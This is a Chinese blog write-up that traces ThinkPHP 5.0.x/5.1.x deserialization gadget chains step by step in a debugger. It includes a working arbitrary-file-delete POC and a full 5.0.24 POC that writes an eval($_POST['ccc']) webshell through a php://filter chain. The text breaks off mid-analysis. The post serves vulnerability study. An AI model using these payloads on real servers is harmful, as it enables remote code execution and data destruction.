[{"title":"Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习","url":"/post/60ce7176.html","content":"\nThinkphp5.0.x~5.2.x版本反序列化链挖掘学习\n\n<!--more-->\n\n# 基础知识\n\n## namespace命名空间和子命名空间\n\n首先我们需要知道为什么需要命名空间呢？\n\n在大型PHP项目中，可能存在大量的类，函数和常量，而这些可能来自不同的库和团队，为了避免冲突，php就引进了命名空间。\n\n```plain\n<?php\nnamespace Animals\\cat;\nclass cat{\n    public function __construct(){\n        echo \"miao~\".\"\\n\";\n    }\n}\n$cat = new cat();\n\n\nnamespace Animals\\dog;\nclass dog{\n    public function __construct(){\n        echo \"wow\".\"\\n\";\n    }\n}\n$Dog = new dog();\n\n\nnamespace Animals\\bird;\nclass bird{\n    public function __construct(){\n        echo \"6\".\"\\n\";\n    }\n}\n$Bird = new bird();\n\n?>\n```\n\n以上例子中 Animals就是一个命令空间 而cat dog bird 都是其子命名空间\n\n在创建实例的时候这里也有讲究 \n\n一种是直接在相关类之后进行创建实例 比如：\n\n```plain\nnamespace Animals\\cat;\nclass cat{\n    public function __construct(){\n        echo \"miao~\".\"\\n\";\n    }\n}\n$cat = new cat();\n```\n\n一种是可以在任意地方创建 但是要加上命名空间 即：`\\命名空间\\子命令空间\\class类名`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506070640-a0e9e936-106b-44f6-85f1-ee981404a6f3.png)\n\n还有一个知识点是利用use 在这里可以理解为是require inlcude这样的函数 \n\n即可以在当前命名空间使用引入其他命名空间\n\n比如根据代码顺序 我们创建实例的代码都属于是bird命名空间里的\n\n也就是bird无需指定命名空间 直接申明即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506380739-b91e4da1-9830-4901-80af-9985cee77b0a.png)\n\n如果使用use 则直接创建实例时无需在之前加上命名空间了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701506494614-a124ea63-0308-4205-8957-45b55753a1bd.png)\n\n## 类的继承\n\n通过关键字extends来实现\n\n通过一个demo简单理解\n\n```plain\n<?php\nclass father{\n    public $name = \"Tom\";\n    public $age = 100;\n    public function saysomething(){\n        echo \"father is saying\".\"\\n\";\n    }\n    public function sleeping(){\n        echo \"i am sleeping\".\"\\n\";\n    }\n}\nclass son extends father{\n    public $name = \"Lihua\";\n    public function saysomething(){\n        echo \"son is saying\".\"\\n\";\n    }\n    public function parentsaying(){\n        parent::saysomething();\n    }\n}\n$Son = new son;\necho $Son->age.\"\\n\";\n$Son->saysomething();\n$Son->parentsaying();\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507164342-e144b983-4bd2-4d60-8122-a6250e50533d.png)\n\n可以看到子类会继承父类中的属性和方法，当然只限于（public和protected类型而private是无法继承也无法访问的）子类同名函数会覆盖父类，子类也可以通过`parent::method`访问父类被覆盖的方法。\n\n## trait修饰符\n\ntrait修饰符使得被修饰的类可以复用，增加了代码的复用性\n\n即我们可以在一个类中包含一个被trait修饰的类 并且使用其方法和属性\n\n```plain\n<?php\ntrait test{\n    public $a = \"ok\";\n    public function test(){\n        echo \"test\\n\";\n    }\n}\n\nclass impl{\n    use test;\n    public function __construct()\n    {\n        echo \"impl\\n\";\n    }\n\n}\n$t=new impl();\n$t->test();\necho $t->a;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701507738113-fb2c8dff-3d2e-40fe-a6d3-33cde99fe838.png)\n\n还有一个b神例子也可以来理解一下 方便之后去调试thinkphp链子\n\n```plain\n<?php\nnamespace np1\\A;\n\nuse np2\\A\\Boogipop;\n\nclass Z1d10t{\n    use Boogipop;\n    public function __construct()\n    {\n        echo \"dawn_construct\\n\";\n    }\n}\n<?php\nnamespace np2\\A;\nrequire(\"2.php\");\nuse np1\\A\\Z1d10t;\ntrait Boogipop{\n    public function __toString()\n    {\n        echo \"tostring\\n\";\n        return \"\";\n    }\n}\n$a=new Z1d10t();\necho $a;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701508172292-6203230e-df2e-41b6-96e6-83ae66b3fe69.png)\n\n可以看到我们用trait修饰了Boogipop类并且在Z1d10t中use复用了它\n\n然后我们创建一个Z1d10t的类 并且直接输出他\n\n那么我们知道当直接输出一个对象时候就会调用__toString魔术方法\n\n但是Z1d10t中并没有__toStiring魔术方法而Boogipop类中有却被调用了 这就很神奇了\n\n# 5.1.x版本分析\n\n## 环境搭建\n\n- \n\n那么当然是看官方文档https://www.thinkphp.cn/doc\n\n这里建议在安装时老老实实利用composer 用git的时候报了好多错\n\n把下载的源码包放到phpstudy根目录下\n\n然后就是phpstudy联动phpstorm 推荐一篇文章：[phpstorm+phpstudy调试thinkphp_如何在phpstorm中调试php程序-CSDN博客](https://blog.csdn.net/qq_62989306/article/details/126913050)\n\n这里遇到的坑就是我composer下载指定thinkphp版本为5.1.37时 他自动下载为thinkphp5.1.42\n\n折磨了我一下午 最终问gpt得到了解决方法\n\n在我们下好thinkphp5.1.42目录下 有个composer.json 将原来的5.1.*改为指定的5.1.37\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517846484-9322664c-576b-4862-a671-9f8c4d7b8029.png)\n\n然后 `composer update` 他就会自动重新帮我们拉取依赖 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701517905050-35a888c9-067e-45a8-ac54-df0d659b36cb.png)\n\n最终解决了 可以愉快的调试了\n\n## 挖掘\n\n首先我们需要设置一个触发点 将控制器中的index控制器修改为\n\n```plain\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index($input=\"\")\n    {\n        echo \"ThinkPHP5_Unserialize:\\n\";\n        unserialize(base64_decode($input));\n        return '<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style=\"padding: 24px 48px;\"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style=\"font-size:30px\">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=64890268\" charset=\"UTF-8\"></script><script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"></script><think id=\"eab4b9f840753f8e7\"></think>';\n    }\n\n    public function hello($name = 'ThinkPHP5')\n    {\n        return 'hello,' . $name;\n    }\n}\n```\n\n然后在反序列化入口函数处打一个断点\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771728123-14c8df13-e5d2-454d-8f6f-26237ee644c5.png)\n\n先测试我们的poc 可以发现是可以正常触发的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701771807938-8ed628fb-4a11-4ea4-a9a1-db0fe81e2f43.png)\n\n接下来一步步调试\n\n首先是进入了Windows.php的Windows类的析构函数\n\n我们观察poc 也可以发现最外层套的是`think\\process\\pipes\\Windows`对象 因此首先会进入该对象![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772315555-d5626d78-382d-4f16-99f6-3d4a602589b0.png)\n\n这里windows类还继承了Pipes这个抽象类\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772344277-6435c36f-0019-440b-a1df-394f527d018b.png)\n\n继续跟进 进入了removeFIles这个函数中\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701772458028-3eae1587-619c-45f4-a948-b29042e3c6d4.png)\n\n该方法会遍历files数组 然后删除\n\n这里调用了一个`$this->files`并且$files是可控的因此这里还存在一个任意文件删除的漏洞\n\npoc：\n\n```plain\n<?php\nnamespace think\\process\\pipes;\n\nclass Pipes{\n\n}\n\nclass Windows extends Pipes\n{\nprivate $files = [];\n\npublic function __construct()\n{\n$this->files=['需要删除文件的路径'];\n}\n}\n\necho base64_encode(serialize(new Windows()));\n?>\n```\n\n`file_exists`函数对`$filename`进行处理  并且此时`$filename`会被当作字符串string进行处理\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773147093-5262c202-22e6-4d65-bb57-4cf9ebdae72e.png)\n\n并且根据我们的poc可知 我们传入的是 Pivot对象\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773205554-8aeb5f36-68e4-4c53-8750-89cd614fe876.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773248506-71e26aca-d9cb-40d7-9972-064416dc6897.png)\n\n那当一个对象当作字符串被处理时，会触发__toString魔术方法\n\n继续跟进 发现难道不应该触发Pivot函数的__toString魔术方法吗 为什么会跳到Conversion对象\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773714546-13e03ac3-a462-4633-92a3-9e59c7a4b68e.png)\n\n这里就用到了之前说的trait复用的知识点了\n\n我们可以看到 Convertion被trait修饰了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701773898203-2f4d1683-7279-4aa4-97f3-29d28fd667ed.png)\n\n并且Pivot对象基类是Model 它内部没有toString魔术方法 \n\n但是构造函数中调用的是父类的构造方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701774046856-246081eb-2a34-4ff6-8c3f-dc09dd85a82b.png)\n\n我们继续跟进Model类 可以发现它use了`model\\concern\\Conversion`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775270704-d7d5025e-ece6-4412-a53c-0e18d905cfb6.png)\n\n因此Model复用了Conversion类 而它又是Pivot类的父类 \n\n当Pivot对象被当作字符串输出的时候 就会调用Conversion类的toString方法\n\n这也就是为什么我跟进链子到了 Converison类的tostring方法了 \n\n思路清晰 继续\n\n接着调用了toJson函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775565756-3c86b4e4-0a76-4460-a8e9-23d85dc135a0.png)\n\n接着调用了toArray函数 然后转为了json字符串 继续跟进toArray\n\n先遍历this->append属性 取出键值对 对应我们poc中的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775854515-40420207-d28d-4c61-86fb-026aedf3c565.png)\n\nkey为Z1d10t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701775999642-0e5e090f-8e16-436c-bf49-8f31f4aa886e.png)\n\n接着进入getRelation函数中\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776064817-0cafd189-bcf1-41a7-b4a9-096cae286ecf.png)\n\n因为我们没有给`$this->relation`赋值 因此return null就结束并且出来了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776176513-ca575be3-1319-4576-af3d-6f35ee28351d.png)\n\n接着进入getAttr函数\n\npoc中我们将`$this->data`赋值为一个对象 因此return一个Request对象之后 就会退出该方法 出来\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776480917-1ed0551f-cb6c-4d22-a302-eacaf644d712.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701847452355-9384cf4e-7e1d-44cb-a11d-320102b41f90.png)\n\n`$relation`变为了Request对象 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701776652298-17f4b401-e97e-4293-9f0f-cd0dad786c79.png)\n\n调用`$relation->visible()` 并且参数为`[calc,calc.exe]`  而Requset类是没有visible函数的\n\n因此会调用它的__call方法 \n\n一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用\n\n```\n__call_user_func($method, $args) \n__call_user_func_array([$obj,$method], $args)\n```\n\n我们跟进它\n\n发现它调用 `call_user_func_array`方法 这可不是一个好方法:)\n\n并且这里$hook是我们可控的 因此我们可以设计一个数组`$hook= {“visable”=>”任意method”}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777056201-b2143552-59e9-49a5-88a2-70c0d3f5632d.png)\n\n但是在这里array_unshift函数在之前的`[calc,calc.exe]`数组开头中插入Request对象 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777151041-f0aa6009-994d-4ac8-aa00-307fb4075910.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701777278378-bdcef651-2589-47c6-9af7-e41df72e38d6.png)\n\n我们知道`call_user_func_array`函数会把第一个参数作为回调函数调用，第二参数是一个数组，并且将数组作为回调函数的参数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701778235498-ff04b99e-9809-47cb-a359-5531b29dd4d7.png)\n\n`$this->hook`为一个数组并且我们可控 然后取键名为visible的值\n\n那么我们只能是（偷的）\n\n```plain\ncall_user_func_array([$obj,\"任意方法\"],[$this,任意参数])\n也就是\n$obj->$func($this,$argv)\n```\n\n那这里需要知道的是回调函数不光只是简简单单的普通函数\n\n还可以是对象的方法 包括静态类方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779197684-4971d72a-f30b-46a7-8878-ba2e5b952d49.png)\n\n因此这里就可以理解上述中call_user_func_array中第一个参数函数格式为`[$obj,\"任意方法\"]`也就是对象的方法\n\n而参数由于array_unshift函数的缘故第一个为`$this`也就是一个对象\n\n`$obj->$func($this,$argv)`那么直接用这种方式去RCE 很难的拉\n\n此时就要用到了Request类中一个特殊的功能就是过滤器filter\n\n并且ThinkPHP中的多个RCE漏洞都是由于这个过滤器\n\n所以我们可以去尝试覆盖filter方法去RCE\n\n我们先来看看这个filter\n\n```plain\nprivate function filterValue(&$value, $key, $filters)\n    {\n        $default = array_pop($filters);\n\n        foreach ($filters as $filter) {\n            if (is_callable($filter)) {\n                // 调用函数或者方法过滤\n                $value = call_user_func($filter, $value);\n            } elseif (is_scalar($value)) {\n                if (false !== strpos($filter, '/')) {\n                    // 正则过滤\n                    if (!preg_match($filter, $value)) {\n                        // 匹配不成功返回默认值\n                        $value = $default;\n                        break;\n                    }\n                } elseif (!empty($filter)) {\n                    // filter函数不存在时, 则使用filter_var进行过滤\n                    // filter为非整形值时, 调用filter_id取得过滤id\n                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));\n                    if (false === $value) {\n                        $value = $default;\n                        break;\n                    }\n                }\n            }\n        }\n\n        return $value;\n    }\n```\n\n该方法调用了`call_user_func` 但是在这里`$value`参数不可直接控 \n\n继续寻找\n\n发现input函数调用了这个filterValue\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779812219-588beaf8-9bb2-44da-abb7-9c14ed94ec2c.png)\n\n```plain\n public function input($data = [], $name = '', $default = null, $filter = '')\n    {\n        if (false === $name) {\n            // 获取原始数据\n            return $data;\n        }\n\n        $name = (string) $name;\n        if ('' != $name) {\n            // 解析name\n            if (strpos($name, '/')) {\n                list($name, $type) = explode('/', $name);\n            }\n\n            $data = $this->getData($data, $name);\n\n            if (is_null($data)) {\n                return $default;\n            }\n\n            if (is_object($data)) {\n                return $data;\n            }\n        }\n\n        // 解析过滤器\n        $filter = $this->getFilter($filter, $default);\n\n        if (is_array($data)) {\n            array_walk_recursive($data, [$this, 'filterValue'], $filter);\n            if (version_compare(PHP_VERSION, '7.1.0', '<')) {\n                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针\n                $this->arrayReset($data);\n            }\n        } else {\n            $this->filterValue($data, $name, $filter);\n        }\n\n        if (isset($type) && $data !== $default) {\n            // 强制类型转换\n            $this->typeCast($data, $type);\n        }\n\n        return $data;\n    }\n```\n\n但是这里参数仍旧不可控 不能直接使用\n\n那么继续看看谁调用了input 套娃就完事了\n\n那么这里是找到了param函数 不过参数仍旧不可控\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779998764-57f74acd-6dab-437f-a507-7a4ffcb6e633.png)\n\n```plain\npublic function param($name = '', $default = null, $filter = '')\n    {\n        if (!$this->mergeParam) {\n            $method = $this->method(true);\n\n            // 自动获取请求变量\n            switch ($method) {\n                case 'POST':\n                    $vars = $this->post(false);\n                    break;\n                case 'PUT':\n                case 'DELETE':\n                case 'PATCH':\n                    $vars = $this->put(false);\n                    break;\n                default:\n                    $vars = [];\n            }\n\n            // 当前请求参数和URL地址中的参数合并\n            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));\n\n            $this->mergeParam = true;\n        }\n\n        if (true === $name) {\n            // 获取包含文件上传信息的数组\n            $file = $this->file();\n            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;\n\n            return $this->input($data, '', $default, $filter);\n        }\n\n        return $this->input($this->param, $name, $default, $filter);\n    }\n```\n\n继续寻找谁调用了param\n\n找到了 isAjax函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701780098519-a4d71b56-0839-4ef4-a226-8d9dcb651cba.png)\n\n```plain\n public function isPjax($pjax = false)\n    {\n        $result = !is_null($this->server('HTTP_X_PJAX')) ? true : false;\n\n        if (true === $pjax) {\n            return $result;\n        }\n\n        $result           = $this->param($this->config['var_pjax']) ? true : $result;\n        $this->mergeParam = false;\n        return $result;\n    }\n```\n\n而isAjax函数中 我们可控`$this->config['var_pjax']`\n\n意味着param函数中`$name`可控\n\n意味着input函数中的`$name`可控\n\n在这里 以上我们说什么可控 什么不可控应该怎么判断呢 \n\n可以直接看类属性 类中明确定义了某个属性 那么这个属性我们就可以重写来控制\n\n而param函数可以获得`$_GET`数组 并且赋值给`$this->param`\n\n```\n$this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782687578-16bc813b-9534-49c7-b37d-444a01d9a9b7.png)\n\n跟进input\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781256320-141b25c8-120a-469c-90e9-86989d2047f6.png)\n\n跟进getData\n\n```plain\nprotected function getData(array $data, $name)\n    {\n        foreach (explode('.', $name) as $val) {\n            if (isset($data[$val])) {\n                $data = $data[$val];\n            } else {\n                return;\n            }\n        }\n\n        return $data;\n    }\n$data=$data[$val]=$data[$name]\n```\n\n从GET数组中获取键名为Z1d10t的键值\n\n并且返回值就是我们的命令 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781443982-69813e68-019a-4b4b-bdea-6c6cd5eea7df.png)\n\n接着进入getFilter函数获取filter属性\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781754618-b96d3cc0-7e9d-486f-a068-2c522e2813db.png)\n\n在param函数中filter首先为空 然后在这里用`$this->filter`赋值 因此我们可以再poc中重新赋值为system\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781901324-7242fa00-4545-438d-b596-4fafb50146c4.png)\n\n然后在$filter数组追加一个default 值为null 没大用 然后返回\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781993001-c21d178c-8095-49ed-a55a-173e719c21a3.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782003574-6cab6507-0e00-4ccd-8d28-7990359fb177.png)\n\n最后进入filterValue函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782079134-841663cb-5743-4e13-82ea-e6a79e5ab3c4.png)\n\n用array_pop弹出数组末尾的元素 因此只剩下了system\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782149417-fcbf6955-1c8c-488f-ab51-5f4a9dcab3b0.png)\n\n然后再调用call_user_func方法 完成RCE\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782415565-2b48611f-8f94-40e3-81dc-ec156a1dcb46.png)\n\nok 让我们再来梳理一下思路 \n\n这里我们可以从两个方向正向与反向去分析比较清晰 \n\n正向：\n\n```plain\n\\thinkphp\\library\\think\\process\\pipes\\Windows.php - > __destruct()\n\\thinkphp\\library\\think\\process\\pipes\\Windows.php - > removeFiles()\nWindows.php:file_exists() 由于传入了new Pivot() 将对象当作了字符串处理 触发__toString\n由于Pivot类没有__toString 但是他继承了Model类 但是该类也不存在 然而它复用了Conversion类 可以用它的toString\n因此到了Conversion类\nthinkphp\\library\\think\\model\\concern\\Conversion.php - > __toString()\n__toString中又调用了toJon\nthinkphp\\library\\think\\model\\concern\\Conversion.php - > toJson() \ntojson()中又调用了toarray()\ntoarray中存在调用visible()这个函数 此时思路为如果调用某个对象不存在的函数 那么会触发__call()\n并且Conversion类中$this->data类属性我们可控 getAttr()会获取键为Z1d10t的值 我们给他赋值一个对象Request\n因此到了Request类\nthinkphp\\library\\think\\Request.php   - > __call()\n该call函数中有call_user_func_array是可以执行命令但是 由于arary_unshift函数我们的参数第一个为一个对象因此没法愉快的执行函数\n此时正向就先断开了\n```\n\n反向\n\n```plain\n前面由于参数不理想 我们没法愉快的执行函数 因此我们只好寻找其他方法\n那么存在filterValue这个过滤器函数 该函数直接存在call_user_func($filter,$value)\n在这里我们$filter是直接可控的 但是呢 $value是不可直接控制的 因此通过链式调用去看看哪个函数可以控制该$value\n最后找到input函数中调用了filterValue()\nthinkphp\\library\\think\\Request.php - > input()  $data由param()的$param控制 $name由param()的name控制\nthinkphp\\library\\think\\Request.php - > param()  $param通过get方式传参可控 $name可控由isAjax()可控\nthinkphp\\library\\think\\Request.php - > isAjax() 它传给param()的$this->config['var_ajax']是可控的 使得param() $name可控\n那么依次是找到了isAjax()->param()->input()->filterValue() （以上过程倒着看）\n依次执行函数需要的$value可控了 只需要用正向最后拿到的call_user_func_array()将isAjax()串起来 \n那么整条链子就通了\nthinkphp\\library\\think\\Request.php - > filterValue()\n```\n\n偷包浆的图 这个图思路太清晰了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png)\n\n## 修复\n\n直接把__call()方法砍了 后面的链子也就断掉了\n\n# 5.2.x版本分析\n\n这里官方已经把Thinkphp5.2.x升级为Thinkphp6.0因此没法下载5.2.x的源码包 \n\n寄 网上找不到相关源码包\n\n之后在6.x分析再回顾吧\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701853032417-15c295a4-6a2d-4321-9e45-802d2c775af2.png)\n\n可以看这位师傅的[thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区](https://xz.aliyun.com/t/6619#toc-1)\n\n\n\n# 5.0.x版本分析\n\n## 环境搭建\n\n- php5.0.24+Xdebug+thinkphp5.0.24+phpstudy+phpstorm \n\n和上面一样准备一个二次反序列化入口 替换`/application/index/controller/index.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701854704626-44a5de6b-09a6-4e37-ad44-b82ebe834d82.png)\n\npoc：（影响版本5.0.24和5.0.18，5.0.9不可用）\n\n```plain\n<?php\n\n//__destruct\nnamespace think\\process\\pipes{\n    class Windows{\n        private $files=[];\n\n        public function __construct($pivot)\n        {\n            $this->files[]=$pivot; //传入Pivot类\n        }\n    }\n}\n\n//__toString Model子类\nnamespace think\\model{\n    class Pivot{\n        protected $parent;\n        protected $append = [];\n        protected $error;\n\n        public function __construct($output,$hasone)\n        {\n            $this->parent=$output; //$this->parent等于Output类\n            $this->append=['a'=>'getError'];\n            $this->error=$hasone;   //$modelRelation=$this->error\n        }\n    }\n}\n\n//getModel\nnamespace think\\db{\n    class Query\n    {\n        protected $model;\n\n        public function __construct($output)\n        {\n            $this->model=$output; //get_class($modelRelation->getModel()) == get_class($this->parent)\n        }\n    }\n}\n\nnamespace think\\console{\n    class Output\n    {\n        private $handle = null;\n        protected $styles;\n        public function __construct($memcached)\n        {\n            $this->handle=$memcached;\n            $this->styles=['getAttr'];\n        }\n    }\n}\n\n//Relation\nnamespace think\\model\\relation{\n    class HasOne{\n        protected $query;\n        protected $selfRelation;\n        protected $bindAttr = [];\n\n        public function __construct($query)\n        {\n            $this->query=$query; //调用Query类的getModel\n\n            $this->selfRelation=false; //满足条件!$modelRelation->isSelfRelation()\n            $this->bindAttr=['a'=>'admin'];  //控制__call的参数$attr\n        }\n    }\n}\n\nnamespace think\\session\\driver{\n    class Memcached{\n        protected $handler = null;\n\n        public function __construct($file)\n        {\n            $this->handler=$file; //$this->handler等于File类\n        }\n    }\n}\n\nnamespace think\\cache\\driver{\n    class File{\n        protected $options = [\n            'path'=> 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',\n            'cache_subdir'=>false,\n            'prefix'=>'',\n            'data_compress'=>false\n        ];\n        protected $tag=true;\n\n\n    }\n}\n\nnamespace {\n    $file=new think\\cache\\driver\\File();\n    $memcached=new think\\session\\driver\\Memcached($file);\n    $output=new think\\console\\Output($memcached);\n    $query=new think\\db\\Query($output);\n    $hasone=new think\\model\\relation\\HasOne($query);\n    $pivot=new think\\model\\Pivot($output,$hasone);\n    $windows=new think\\process\\pipes\\Windows($pivot);\n\n    echo base64_encode(serialize($windows));\n}\n```\n\n将生成的payload 在首先给input传参 （原谅这里为什么是thinkphp5.1 只要\\thinkphp\\base.php显示版本是正确的即可）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855243164-639a1a3d-c7c6-4530-9997-781cc8000fa9.png)\n\n然后访问`/public/a.php3b58a9545013e88c7186db11bb158c44.php`\n\n密码为ccc 可见是可以打通的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855194658-fff84791-d39a-4d12-a5a0-314b74e7a472.png)\n\n可以看一下我们写马上去的文件内容 可见不是正常的一句话 里面其实还包括了filterchain的知识点\n\n一句话理解就是利用base64、iconv等编码组合构造出特定的php代码进而完成无需临时文件的RCE 并且可以绕过死亡函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855894718-11638ac7-dace-4401-a191-35e6dd8bd4e3.png)\n\n## 挖掘\n\n首先我们的入口点还是Windows.php的析构函数 前面一部分的链子和5.1.x的差不多\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375636049-c3987dc4-2055-40d9-afb2-e19ef408cc37.png)\n\n继续跟进 到了removeFiles() 这里还是一样由于直接把对象当作字符串传入file_exists函数 因此导致会触发`__toString()` \n\n但是和5.1.x的链子不同的是5.0.x的model类有`__toSting()` 因此不需要use 5.1.x的被trait修饰的Converison类用它的`__toString()`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375828839-82070bc9-5c06-4c40-b71a-835552d0f7de.png)\n\n继续跟进 到toJson()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375862497-c655956d-eb3c-4409-99d4-7eb0b9ea9892.png)\n\n然后进到了toArray()函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376002618-a6d2f155-ae7a-4b05-8ba7-71a97e257ebb.png)\n\n这里有四个断点我们需要着重分析\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376154221-3e88dbd1-be05-4e8a-8552-5d5d9e3d7c5e.png)\n\n首先这里`$relation`是通过`parseName`方法完成的 顺便提一嘴 这里调用方法方式是通过静态方法调用的\n\n那这里我们需要知道`$name `的值是通过遍历`$this->append`数组赋值的为getError\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376915350-5f097820-b5a3-413a-b85f-157888ed6d97.png)\n\n那这里有个疑惑就是我们poc中是给Pivot类的`$this->append`赋值的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376975289-22b19a10-94c9-4d5a-b5b1-6fb5d6524397.png)\n\n为什么这里Model直接用呢 因为Model是Pivot的父类 因此父类可以直接调用子类的protected修饰的属性\n\nok 我们继续跟进分析一下\n\n这里`type=1`进入if语句 直接返回getError\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377084411-7ec81a05-3bb0-49b6-acb3-8fd7b9c99bd6.png)\n\n此时$relation为getError 继续到 `method_exists`函数 \n\nModel这个类是有getError函数的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377185911-2e85ad88-f1ec-4ea5-8aa1-54a915edc50d.png)\n\n因此会进入 这里的error可控 并且我们设置为了HasOne对象 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377378463-a7d85d0c-8de6-43d0-b817-a926d5b334ee.png)\n\n同样poc中也是可以体现出来的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383452619-335e2d8b-8178-46ec-87e6-bf8d4f2f2b1d.png)\n\n第一个断点至此先说到这里 